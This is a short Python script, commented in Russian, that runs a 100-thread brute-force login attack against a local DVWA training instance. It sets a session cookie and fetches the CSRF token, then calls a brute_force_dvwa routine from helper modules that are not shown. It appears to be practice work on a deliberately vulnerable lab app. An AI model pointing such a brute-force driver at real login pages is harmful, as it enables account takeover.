from networking import NetworkUtil
from generator import GenerationUtil

if __name__ == "__main__":
    base_url = "http://localhost:4280/vulnerabilities/brute/"
    index_url = "http://localhost:4280/index.php"
    # Замените PHPSESSID на вашу
    cookie = {"security": "low", "PHPSESSID": "763d3798aads53ds09a1dfs1a6ad3"}
    network_util = NetworkUtil(cookies=cookie)

    thread_count = 100

    # Загружаем index.php с использованием cookie
    index_content = network_util.fetch_index_page(index_url)

    if index_content is None or "login.php" in index_content:
        print("Сессия устарела")
    else:
        print(f"Содержимое index.php:\n{index_content}")

    user_token = network_util.fetch_user_token(base_url)
    print(user_token)

    if user_token is None:
        print("Не удалось получить user_token. Проверьте URL.")
    else:
        generation_util = GenerationUtil(
            base_url=base_url,
            user_token=user_token,
            thread_count=thread_count,
            network_util=network_util
        )
        generation_util.brute_force_dvwa()
